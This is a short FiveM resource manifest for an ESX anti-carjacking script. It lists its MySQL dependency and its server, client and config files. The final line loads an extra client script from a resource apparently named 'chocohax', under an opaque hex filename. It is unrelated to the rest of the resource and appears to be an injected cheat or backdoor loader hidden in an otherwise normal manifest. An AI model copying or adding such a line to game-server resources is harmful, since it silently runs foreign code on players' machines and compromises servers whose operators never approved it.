resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX NoCarJack - by 0xNOP @ FiveM'

version '1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/nocarjack_sv.lua'
}

client_scripts {
	'client/nocarjack_cl.lua',
	'cfg/nocarjack.lua'
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'